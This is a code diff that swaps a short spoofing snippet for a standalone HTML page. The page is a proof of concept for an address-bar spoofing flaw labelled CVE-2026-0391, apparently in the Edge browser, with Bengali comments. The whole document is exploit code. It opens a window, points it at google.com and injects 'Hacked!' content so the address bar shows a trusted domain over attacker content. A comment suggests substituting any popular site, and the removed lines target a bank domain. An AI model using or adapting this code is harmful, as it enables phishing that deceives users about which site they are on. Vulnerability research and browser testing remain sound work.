@@ -1,5 +1,36 @@
-function spoof() {
-    var win = window.open("https://attacker-site.com", "_blank");
-    // ব্রাউজার যখন আসল সাইট লোড করার চেষ্টা করবে, তখন দ্রুত অ্যাড্রেস বার আপডেট করে দেওয়া
-    win.location = "https://trusted-bank.com"; 
-}
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2026-0391 PoC Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: Arial; text-align: center; padding-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0078d4; color: white; border: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+
+    <h1>Security Research: CVE-2026-0391</h1>
+    <p>এই বাটনটি ক্লিক করলে যদি অ্যাড্রেস বারে <b>google.com</b> দেখায় কিন্তু পেজটি এই সাইটেই থাকে, তবে ব্রাউজারটি Vulnerable।</p>
+    
+    <button onclick="testSpoof()">Test Vulnerability</button>
+
+    <script>
+        function testSpoof() {
+            // ১. একটি নতুন উইন্ডো বা ট্যাব ওপেন করা
+            var spoofWindow = window.open("about:blank", "_blank");
+
+            // ২. এজ ব্রাউজারের UI ত্রুটিকে কাজে লাগিয়ে টাইমড আউট রিডাইরেকশন
+            setTimeout(function() {
+                // এখানে 'trusted.com' এর জায়গায় যেকোনো জনপ্রিয় সাইট দিন
+                spoofWindow.location.href = "https://google.com";
+                
+                // ৩. খুব দ্রুত কন্টেন্ট ইনজেক্ট করা যা অ্যাড্রেস বার আপডেট হতে বাধা দেয়
+                setTimeout(function() {
+                    spoofWindow.document.body.innerHTML = "<h1>Hacked!</h1><p>অ্যাড্রেস বার দেখুন, সেখানে google.com দেখাচ্ছে কিন্তু কন্টেন্ট আমার তৈরি।</p>";
+                }, 50);
+            }, 100);
+        }
+    </script>
+</body>
+</html>
